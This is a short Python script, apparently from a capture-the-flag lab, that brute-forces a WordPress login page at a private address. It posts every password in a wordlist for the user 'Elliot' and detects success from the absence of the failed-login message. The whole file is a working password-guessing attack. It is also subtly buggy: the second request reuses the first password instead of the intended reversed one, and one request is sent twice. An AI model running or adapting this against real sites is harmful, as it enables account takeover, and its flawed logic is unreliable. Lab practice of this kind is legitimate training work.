# Brute-force
# Copy curl from devtools, then convert to python with https://curl.trillworks.com/

import requests

FILE = "/root/mrrobot/fsocity.dic"
ADDRESS = "http://10.10.255.85/wp-login.php?"


cookies = {
    "s_cc": "true",
    "s_fid": "5BB7F03E8E557905-365A053F5893E838",
    "s_nr": "1617469117638",
    "s_sq": "%5B%5BB%5D%5D",
    "wordpress_test_cookie": "WP+Cookie+check",
}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
}

file = open(FILE, "rb")
passwords = file.readlines()
num_lines = len(passwords)

for index, password in enumerate(passwords, 0):
    pw = password.strip().decode("utf-8")
    data = {
        "log": "Elliot",
        "pwd": pw,
        "wp-submit": "Log+In",
        "redirect_to": "http%3A%2F%2F10.10.255.85%2Fwp-admin%2F",
    }
    res = requests.post(ADDRESS, headers=headers, cookies=cookies, data=data)
    pw2 = passwords[-index].strip().decode("utf-8")
    print(pw2)
    data2 = {
        "log": "Elliot",
        "pwd": pw,
        "wp-submit": "Log+In",
        "redirect_to": "http%3A%2F%2F10.10.255.85%2Fwp-admin%2F",
    }
    res = requests.post(ADDRESS, headers=headers, cookies=cookies, data=data)
    res2 = requests.post(ADDRESS, headers=headers, cookies=cookies, data=data2)
    if (
        not "The password you entered for the" in res.text
        or not "The password you entered for the" in res2.text
    ):
        print("found password. one of: " + pw + " " + pw2)
        quit()
    else:
        if index % 100 == 0:
            print(
                "processed passwords:",
                index,
                "of",
                num_lines,
                ". Left: ",
                num_lines - index,
            )
